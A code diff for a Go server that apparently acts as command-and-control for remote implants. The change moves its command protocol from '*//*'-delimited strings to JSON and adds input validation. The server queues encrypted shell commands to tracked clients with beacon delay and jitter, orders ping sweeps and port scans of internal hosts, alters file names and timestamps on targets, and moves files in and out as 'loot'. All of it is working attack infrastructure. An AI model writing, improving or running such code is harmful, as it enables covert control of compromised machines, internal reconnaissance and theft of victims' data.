@@ -743,20 +743,95 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 						continue
 					}
 				case "msg":
-					uid, _ := body["uid"].(string)
-					msg, _ := body["msg"].(string)
-					taskid, _ := body["taskid"].(string)
-					port, _ := body["port"].(string)
+					uid, ok := body["uid"].(string)
+					if !ok || strings.TrimSpace(uid) == "" {
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "msg",
+							"message": "uid is required",
+						})
+						continue
+					}
+				
+					taskid, ok := body["taskid"].(string)
+					if !ok || strings.TrimSpace(taskid) == "" {
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "msg",
+							"message": "taskid is required",
+						})
+						continue
+					}
+				
+					port, ok := body["port"].(string)
+					if !ok || strings.TrimSpace(port) == "" {
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "msg",
+							"message": "port is required",
+						})
+						continue
+					}
+				
+					rawMsg, exists := body["msg"]
+					if !exists || rawMsg == nil {
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "msg",
+							"message": "msg is required",
+						})
+						continue
+					}
+				
+					var msg string
+				
+					switch value := rawMsg.(type) {
+					case string:
+						// 前端传入 JSON 字符串
+						msg = value
+				
+					case map[string]interface{}:
+						// 前端直接传入 JSON 对象
+						data, err := json.Marshal(value)
+						if err != nil {
+							_ = clientWs.WriteJSON(map[string]interface{}{
+								"code":    400,
+								"path":    "msg",
+								"message": "invalid msg object",
+							})
+							continue
+						}
+						msg = string(data)
+				
+					default:
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "msg",
+							"message": "msg must be a JSON string or object",
+						})
+						continue
+					}
+				
+					if strings.TrimSpace(msg) == "" {
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "msg",
+							"message": "msg is empty",
+						})
+						continue
+					}
+				
 					errStr := Getcmd(uid, msg, taskid, port)
 					if errStr != "" {
-						clientWs.WriteJSON(map[string]interface{}{
+						_ = clientWs.WriteJSON(map[string]interface{}{
 							"code":    500,
 							"path":    "msg",
 							"message": errStr,
 						})
 						continue
 					}
-					clientWs.WriteJSON(map[string]interface{}{
+				
+					_ = clientWs.WriteJSON(map[string]interface{}{
 						"code":    200,
 						"path":    "msg",
 						"message": "Message sent successfully",
@@ -3023,22 +3098,25 @@ func normalizeResponseHeaders(v any) (map[string]string, error) {
 func GetInfo(uid, encry_str, clientIP string, key []byte, code_map map[byte]int) {
 	var server_remark string
 	data := Get_decry_s(&encry_str, &key, code_map)
-
-	data_list := strings.Split(data, "*//*")
-	if len(data_list) < 11 { // 需要11个字段
+	var dataList []string
+	if err := json.Unmarshal([]byte(data), &dataList); err != nil {
 		return
 	}
-	shellname := data_list[0]
-	username := data_list[1]
-	osname := data_list[2]
-	t := data_list[3]
-	innet_ip := data_list[4]
-	currentDir := data_list[5]
-	version := data_list[6]
-	port := data_list[7]
-	protocol := data_list[8]
-	jitter := data_list[9]
-	executable := data_list[10]
+	if len(dataList) < 11 {
+		return
+	}
+	shellname := dataList[0]
+	username := dataList[1]
+	osname := dataList[2]
+	t := dataList[3]
+	innet_ip := dataList[4]
+	currentDir := dataList[5]
+	version := dataList[6]
+	port := dataList[7]
+	protocol := dataList[8]
+	jitter := dataList[9]
+	executable := dataList[10]
+
 	current := time.Now()
 	formattedTime := current.Format("2006.01.02 15:04")
 	Remarks := "null"
@@ -3062,7 +3140,10 @@ func GetInfo(uid, encry_str, clientIP string, key []byte, code_map map[byte]int)
 }
 func Windows_GetInfo(uid, encry_str, clientIP string, key []byte, code_map map[byte]int) {
 	data := Get_decry_s(&encry_str, &key, code_map)
-	data_list := strings.Split(data, "*//*")
+	var data_list []string
+	if err := json.Unmarshal([]byte(data), &data_list); err != nil {
+		return
+	}
 	if len(data_list) < 19 { // 需要11个字段
 		return
 	}
@@ -3170,12 +3251,12 @@ func Change_pro(uid, username, remarks, delay, jitter, Taskid, port string) stri
 		if intDelay != client.Delay {
 			client.Delay = intDelay
 			delayModified = true
-			go Getcmd(uid, "GET_DELAY*//*"+strconv.Itoa(intDelay), Taskid, port)
+			go Getcmd(uid, makeCommand("GET_DELAY",strconv.Itoa(intDelay)), Taskid, port)
 		}
 		if intJitter != client.Jitter {
 			client.Jitter = intJitter
 			jitterModified = true
-			go Getcmd(uid, "GET_JITTER*//*"+strconv.Itoa(intJitter), Taskid, port)
+			go Getcmd(uid,  makeCommand("GET_JITTER",strconv.Itoa(intJitter)), Taskid, port)
 		}
 		if !usernameModified && !remarksModified && !delayModified && !jitterModified {
 			return "No changes needed"
@@ -3231,12 +3312,12 @@ func Change(uid, username, remarks, delay, jitter, Taskid, port string) string {
 		if intDelay != client.Delay {
 			client.Delay = intDelay
 			delayModified = true
-			go Getcmd(uid, "GET_DELAY*//*"+strconv.Itoa(intDelay), Taskid, port)
+			go Getcmd(uid, makeCommand("GET_DELAY",strconv.Itoa(intDelay)), Taskid, port)
 		}
 		if intJitter != client.Jitter {
 			client.Jitter = intJitter
 			jitterModified = true
-			go Getcmd(uid, "GET_JITTER*//*"+strconv.Itoa(intJitter), Taskid, port)
+			go Getcmd(uid, makeCommand("GET_JITTER",strconv.Itoa(intJitter)), Taskid, port)
 		}
 		if !usernameModified && !remarksModified && !delayModified && !jitterModified {
 			return "No changes needed"
@@ -3514,10 +3595,13 @@ func Put_file_list(uid, file, taskid string, code_rounds map[byte]int) {
 	decryptedData := Get_decry_s(&file, &key, code_rounds)
 	decryptedTask := Get_decry_s(&taskid, &key, code_rounds)
 	var dir, list string
-	parts := strings.SplitN(decryptedData, "*//*", 2)
-	if len(parts) == 2 {
-		list = parts[0]
-		dir = parts[1]
+	var dataList []string
+	if err := json.Unmarshal([]byte(decryptedData), &dataList); err != nil {
+		return
+	}
+	if len(dataList) == 2 {
+		list = dataList[0]
+		dir = dataList[1]
 	} else {
 		dir = decryptedData
 	}
@@ -3779,8 +3863,7 @@ func GetMsgList(uid string) []string {
 	result := make([]string, 0, len(q.messages))
 	for i := range q.messages {
 		item := &q.messages[i]
-		entry := fmt.Sprintf("%s:\t%s", item.Taskid, item.Ori_Msg)
-		result = append(result, entry)
+		result = append(result, item.Ori_Msg)
 	}
 	return result
 }
@@ -3789,21 +3872,24 @@ func updateGetMsgList(uid string) []string {
 	if uid == "" {
 		return []string{}
 	}
+
 	queuesMu.RLock()
 	q := msgQueues[uid]
 	queuesMu.RUnlock()
+
 	if q == nil {
 		return []string{}
 	}
+
 	q.mu.Lock()
 	defer q.mu.Unlock()
-	// 将最新的一条消息返回
+
 	if len(q.messages) == 0 {
 		return []string{}
 	}
+
 	item := &q.messages[len(q.messages)-1]
-	entry := fmt.Sprintf("%s:\t%s", item.Taskid, item.Ori_Msg)
-	return []string{entry}
+	return []string{item.Ori_Msg}
 }
 
 // 获取结果
@@ -3962,6 +4048,71 @@ func GetMsg(uid, uidBytes string) string {
 }
 
 // 写入指令（推送到对应 uid 的消息队列）
+type CommandMessage struct {
+	Command string   `json:"command"`
+	Args    []string `json:"args,omitempty"`
+	TaskID  string   `json:"task_id,omitempty"`
+}
+
+func decodeCommand(raw string) (CommandMessage, error) {
+	var message CommandMessage
+
+	raw = strings.TrimSpace(raw)
+	if raw == "" {
+		return CommandMessage{}, errors.New("empty command")
+	}
+
+	if err := json.Unmarshal([]byte(raw), &message); err != nil {
+		return CommandMessage{}, errors.New("invalid command format")
+	}
+
+	message.Command = strings.TrimSpace(message.Command)
+	if message.Command == "" {
+		return CommandMessage{}, errors.New("missing command")
+	}
+
+	if message.Args == nil {
+		message.Args = []string{}
+	}
+
+	return message, nil
+}
+
+func encodeCommand(message CommandMessage) (string, error) {
+	data, err := json.Marshal(message)
+	if err != nil {
+		return "", err
+	}
+	return string(data), nil
+}
+
+func makeCommand(command string, args ...string) string {
+	data, err := encodeCommand(CommandMessage{
+		Command: command,
+		Args:    args,
+	})
+	if err != nil {
+		return ""
+	}
+	return data
+}
+
+func normalizeSplitSize(value string) string {
+	value = strings.TrimSpace(value)
+
+	if dot := strings.IndexByte(value, '.'); dot >= 0 {
+		value = value[:dot]
+	}
+
+	size, err := strconv.Atoi(value)
+	if err != nil || size <= 0 {
+		return "1048576"
+	}
+
+	return strconv.Itoa(size)
+}
+
+// 写入指令（推送到对应 uid 的消息队列）
 func Getcmd(uid, cmd, Taskid, port string) string {
 	if uid == "" || port == "" || cmd == "" {
 		return "missing parameter"
@@ -3970,6 +4121,7 @@ func Getcmd(uid, cmd, Taskid, port string) string {
 	serverRouteMu.RLock()
 	baseRounds, exists := base_map[port]
 	serverRouteMu.RUnlock()
+
 	if !exists {
 		return "port not registered"
 	}
@@ -3977,19 +4129,25 @@ func Getcmd(uid, cmd, Taskid, port string) string {
 	keyMu.RLock()
 	key, exists := key_map[uid]
 	keyMu.RUnlock()
+
 	if !exists {
 		return "client not registered"
 	}
 
-	parts := strings.Split(cmd, "*//*")
-	command := parts[0]
+	request, err := decodeCommand(cmd)
+	if err != nil {
+		return err.Error()
+	}
 
-	var finalCmd string
+	command := request.Command
+	args := append([]string(nil), request.Args...)
+
 	var logMsg string
+	includeTaskID := false
 
 	switch command {
 	case "CHANG_FILE_NAME", "CHANG_FILE_TIME":
-		if len(parts) != 3 {
+		if len(args) != 2 || args[0] == "" || args[1] == "" {
 			return "missing parameter"
 		}
 
@@ -3997,32 +4155,30 @@ func Getcmd(uid, cmd, Taskid, port string) string {
 			logMsg = fmt.Sprintf(
 				log_word["change_file_name"],
 				uid,
-				parts[1],
-				parts[2],
+				args[0],
+				args[1],
 			)
 		} else {
 			logMsg = fmt.Sprintf(
 				log_word["change_file_time"],
 				uid,
-				parts[1],
-				parts[2],
+				args[0],
+				args[1],
 			)
 		}
 
-		finalCmd = cmd
-
 	case "SWITCH_VERSION":
-		if len(parts) != 2 || parts[1] == "" {
+		if len(args) != 1 || args[0] == "" {
 			return "missing parameter"
 		}
 
-		version := parts[1]
+		version := args[0]
 
 		go func() {
 			clientDataMu.Lock()
 			for i := range client_data.Clients {
 				client := &client_data.Clients[i]
-				if uid == client.Uid {
+				if client.Uid == uid {
 					client.version = version
 					break
 				}
@@ -4032,7 +4188,7 @@ func Getcmd(uid, cmd, Taskid, port string) string {
 			windows_clientMu.Lock()
 			for i := range windows_client_data.Clients {
 				client := &windows_client_data.Clients[i]
-				if uid == client.Uid {
+				if client.Uid == uid {
 					client.Version = version
 					break
 				}
@@ -4040,21 +4196,18 @@ func Getcmd(uid, cmd, Taskid, port string) string {
 			windows_clientMu.Unlock()
 		}()
 
-		finalCmd = cmd
-
 	case "LOOK_UP_FILE":
-		if len(parts) < 2 || parts[1] == "" {
+		if len(args) != 1 || args[0] == "" {
 			return "missing parameter"
 		}
-
-		finalCmd = cmd + "*//*" + Taskid
-
+	
+		includeTaskID = true
 	case "GET_DELAY", "GET_JITTER":
-		if len(parts) != 2 {
+		if len(args) != 1 {
 			return "missing parameter"
 		}
 
-		value, err := strconv.Atoi(parts[1])
+		value, err := strconv.Atoi(strings.TrimSpace(args[0]))
 		if err != nil {
 			return "parameter is not int"
 		}
@@ -4062,92 +4215,77 @@ func Getcmd(uid, cmd, Taskid, port string) string {
 			return "parameter must be > 0"
 		}
 
-		finalCmd = cmd
+		args[0] = strconv.Itoa(value)
 
 	case "GET_PORTS", "GET_U_FRIENDS":
-		if len(parts) != 4 {
+		if len(args) != 3 {
 			return "missing parameter"
 		}
 
-		sleepTime, err := strconv.Atoi(parts[3])
+		sleepTime, err := strconv.Atoi(strings.TrimSpace(args[2]))
 		if err != nil {
 			return "delay is not int"
 		}
+
 		if sleepTime < 1 {
 			sleepTime = 1
 		}
 
 		if command == "GET_U_FRIENDS" {
-			ipParts := strings.Split(parts[1], ".")
+			ipParts := strings.Split(args[0], ".")
 			if len(ipParts) != 4 || !Check_comment(ipParts[3], "ping") {
 				return "Format error"
 			}
 		}
 
-		if !Check_comment(parts[2], "port") {
+		if !Check_comment(args[1], "port") {
 			return "Format error"
 		}
 
-		finalCmd = fmt.Sprintf(
-			"%s*//*%s*//*%s*//*%d",
-			command,
-			parts[1],
-			parts[2],
-			sleepTime,
-		)
+		args[2] = strconv.Itoa(sleepTime)
 
 		logMsg = fmt.Sprintf(
 			log_word["scan_msg"],
 			uid,
-			parts[1],
+			args[0],
 		)
 
 	case "GET_U_FILE":
-		if len(parts) != 3 {
+		if len(args) != 2 || args[0] == "" {
 			return "missing parameter"
 		}
-
-		splitSizeStr := parts[2]
-		if dot := strings.Index(splitSizeStr, "."); dot != -1 {
-			splitSizeStr = splitSizeStr[:dot]
-		}
-
-		splitSize, err := strconv.Atoi(splitSizeStr)
-		if err != nil || splitSize <= 0 {
-			parts[2] = "1048576"
-		} else {
-			parts[2] = strconv.Itoa(splitSize)
-		}
-
-		finalCmd = strings.Join(parts, "*//*")
+		args[1] = normalizeSplitSize(args[1])
 
 	case "LOAD_U_FILE":
-		if len(parts) != 2 {
+		if len(args) < 3 {
 			return "missing parameter"
 		}
-
-		fileParts := strings.Split(parts[1], "**///**")
-		splitSizeStr := strings.TrimSpace(fileParts[len(fileParts)-1])
-
-		if dot := strings.Index(splitSizeStr, "."); dot != -1 {
-			splitSizeStr = splitSizeStr[:dot]
-		}
-
-		splitSize, err := strconv.Atoi(splitSizeStr)
-		if err != nil || splitSize <= 0 {
-			fileParts[len(fileParts)-1] = "1048576"
-		} else {
-			fileParts[len(fileParts)-1] = strconv.Itoa(splitSize)
-		}
-
-		finalCmd = "LOAD_U_FILE*//*" + strings.Join(fileParts, "**///**")
+		args[len(args)-1] = normalizeSplitSize(args[len(args)-1])
 
 	default:
-		// 普通命令，例如：shell*//*whoami
-		finalCmd = cmd + "*//*" + Taskid
+		includeTaskID = true
 	}
 
-	encryptedCmd := Get_encry_s(&finalCmd, &key, &baseRounds)
+	commandTaskID := ""
+
+	if includeTaskID {
+		commandTaskID = Taskid
+	}
+
+	finalCmd, err := encodeCommand(CommandMessage{
+		Command: command,
+		Args:    args,
+		TaskID:  commandTaskID,
+	})
+	if err != nil {
+		return "failed to encode command"
+	}
+
+	encryptedCmd := Get_encry_s(
+		&finalCmd,
+		&key,
+		&baseRounds,
+	)
 
 	newMsg := Msg_get{
 		Ori_Msg:   cmd,
@@ -4156,6 +4294,7 @@ func Getcmd(uid, cmd, Taskid, port string) string {
 	}
 
 	queue := getOrCreateQueue(uid)
+
 	queue.mu.Lock()
 	queue.messages = append(queue.messages, newMsg)
 	queue.mu.Unlock()
@@ -4173,21 +4312,24 @@ func Getcmd(uid, cmd, Taskid, port string) string {
 			command == "GET_JITTER"
 
 		if !skipLog {
-			logCmd := strings.ReplaceAll(cmd, "*//*", " ")
+			logCmd := command
+			if len(args) > 0 {
+				logCmd += " " + strings.Join(args, " ")
+			}
 
-			go func(uid string) {
+			go func(uid, logCmd string) {
 				clientDataMu.RLock()
 				for i := range client_data.Clients {
 					client := &client_data.Clients[i]
-					if uid == client.Uid {
+					if client.Uid == uid {
 						logStr := fmt.Sprintf(
 							log_word["msg"],
 							client.Host,
 							uid,
 							logCmd,
 						)
-						logger.WriteLog(logStr)
 						clientDataMu.RUnlock()
+						logger.WriteLog(logStr)
 						return
 					}
 				}
@@ -4196,20 +4338,20 @@ func Getcmd(uid, cmd, Taskid, port string) string {
 				windows_clientMu.RLock()
 				for i := range windows_client_data.Clients {
 					client := &windows_client_data.Clients[i]
-					if uid == client.Uid {
+					if client.Uid == uid {
 						logStr := fmt.Sprintf(
 							log_word["msg"],
 							client.Host,
 							uid,
 							logCmd,
 						)
-						logger.WriteLog(logStr)
 						windows_clientMu.RUnlock()
+						logger.WriteLog(logStr)
 						return
 					}
 				}
 				windows_clientMu.RUnlock()
-			}(uid)
+			}(uid, logCmd)
 		}
 	}
 
@@ -4747,27 +4889,33 @@ func DownloadFile(uid, keyDecry string, code_map map[byte]int) ([]byte, error) {
 	DoByteMu.Lock()
 	defer DoByteMu.Unlock()
 	filekey := Get_decry_s(&keyDecry, &key, code_map)
+
 	existingData, exists := DownloadFile_byte_parts[filekey]
 	if !exists {
 		return nil, errors.New("file not found")
 	}
-	parts := strings.Split(filekey, "**///**")
-	if len(parts) != 3 {
-		delete(DownloadFile_byte_parts, filekey)
-		return nil, errors.New("splitSize missing")
+	var fileInfo uploadFileKey
+
+	if err := json.Unmarshal([]byte(filekey), &fileInfo); err != nil {
+		return nil, errors.New("invalid file key")
 	}
-	splitSize, err := strconv.Atoi(parts[2])
-	if err != nil || splitSize <= 0 {
-		delete(DownloadFile_byte_parts, filekey)
-		return nil, errors.New("invalid splitSize")
+
+	if fileInfo.UID != uid {
+		return nil, errors.New("file key does not belong to client")
 	}
+
+	if fileInfo.Filename == "" || fileInfo.SplitSize <= 0 {
+		return nil, errors.New("invalid file key fields")
+	}
+
+	splitSize := fileInfo.SplitSize
 	currentPartsCount, exists := parts_count[filekey]
 	if !exists {
 		currentPartsCount = 0
 	}
 	totalParts := int(math.Ceil(float64(len(existingData)) / float64(splitSize)))
 	if currentPartsCount >= totalParts {
-		log_str := fmt.Sprintf(log_word["download"], uid, parts[1])
+		log_str := fmt.Sprintf(log_word["download"], uid, fileInfo.Filename)
 		logger.WriteLog(log_str)
 		delete(DownloadFile_byte_parts, filekey)
 		delete(parts_count, filekey)
@@ -4785,7 +4933,7 @@ func DownloadFile(uid, keyDecry string, code_map map[byte]int) ([]byte, error) {
 		return nil, errors.New("encry fail")
 	}
 	parts_count[filekey] = currentPartsCount + 1
-	log_str := fmt.Sprintf(log_word["download_part"], uid, parts[1], len(partData), currentPartsCount)
+	log_str := fmt.Sprintf(log_word["download_part"], uid, fileInfo.Filename, len(partData), currentPartsCount)
 	logger.WriteLog(log_str)
 	if parts_count[filekey] >= totalParts {
 		delete(DownloadFile_byte_parts, filekey)
@@ -4814,15 +4962,18 @@ func UploadFileHandler(uid, data, filename string,
 	if !isSafeLootPathPart(realFilename) {
 		return
 	}
-	data_list := strings.Split(decry_data, "*//*")
-	if len(data_list) < 5 {
+	var dataList []string
+	if err := json.Unmarshal([]byte(decry_data), &dataList); err != nil {
 		return
 	}
-	username := data_list[0]
-	splitSize := data_list[1]
-	fileSize := data_list[2]
-	start := data_list[3]
-	end := data_list[4]
+	if len(dataList) < 5 {
+		return
+	}
+	username := dataList[0]
+	splitSize := dataList[1]
+	fileSize := dataList[2]
+	start := dataList[3]
+	end := dataList[4]
 	fileLog := log_word["request_file"]
 	logger.WriteLog(fileLog)
 	splitPos, _ := strconv.Atoi(splitSize)
@@ -5143,15 +5294,15 @@ func updateLoot(uid, filename string) *LootClient {
 // 前端上传文件
 func UserUploadFile(uid, filename, splitSize string, file io.Reader) error {
 	var logStr string
-	// 默认切片大小 1MB
 	if dotIndex := strings.Index(splitSize, "."); dotIndex != -1 {
 		splitSize = splitSize[:dotIndex]
 	}
+
 	splitPos, err := strconv.Atoi(splitSize)
 	if err != nil || splitPos <= 0 {
 		splitPos = 1048576
 	}
-	// 创建临时文件
+
 	tmpFile, err := os.CreateTemp("", "upload-*")
 	if err != nil {
 		logStr = fmt.Sprintf(log_word["tmp_file"], uid, err)
@@ -5160,31 +5311,51 @@ func UserUploadFile(uid, filename, splitSize string, file io.Reader) error {
 	}
 	defer os.Remove(tmpFile.Name())
 	defer tmpFile.Close()
-	// 写入临时文件
+
 	written, err := io.Copy(tmpFile, file)
 	if err != nil {
 		logStr = fmt.Sprintf(log_word["write_tmp"], uid, err)
 		logger.WriteLog(logStr)
 		return err
 	}
-	// 回读内容做加密（如果加密函数不支持流）
+
 	if _, err := tmpFile.Seek(0, io.SeekStart); err != nil {
 		logStr = fmt.Sprintf(log_word["read_tmp"], uid, err)
 		logger.WriteLog(logStr)
 		return err
 	}
+
 	fileContent, err := io.ReadAll(tmpFile)
 	if err != nil {
 		logStr = fmt.Sprintf(log_word["read_tmp"], uid, err)
 		logger.WriteLog(logStr)
 		return err
 	}
-	file_key := uid + "**///**" + filename + "**///**" + strconv.Itoa(splitPos)
+
+	keyData, err := json.Marshal(uploadFileKey{
+		UID:       uid,
+		Filename:  filename,
+		SplitSize: splitPos,
+	})
+	if err != nil {
+		logStr = fmt.Sprintf(log_word["write_tmp"], uid, err)
+		logger.WriteLog(logStr)
+		return err
+	}
+	fileKey := string(keyData)
+
 	DoByteMu.Lock()
-	DownloadFile_byte_parts[file_key] = fileContent
+	DownloadFile_byte_parts[fileKey] = fileContent
 	DoByteMu.Unlock()
-	logStr = fmt.Sprintf(log_word["upload_tmp"], uid, written, filename)
+
+	logStr = fmt.Sprintf(
+		log_word["upload_tmp"],
+		uid,
+		written,
+		filename,
+	)
 	logger.WriteLog(logStr)
+
 	return nil
 }
 
@@ -5700,6 +5871,12 @@ type Data_chat struct {
 
 var data_chat Data_chat
 var dataChatmu sync.RWMutex
+
+type uploadFileKey struct {
+	UID      string `json:"uid"`
+	Filename string `json:"filename"`
+	SplitSize int    `json:"split_size"`
+}
 
 func put_innet(uid, target string, shell_innet []string) {
 
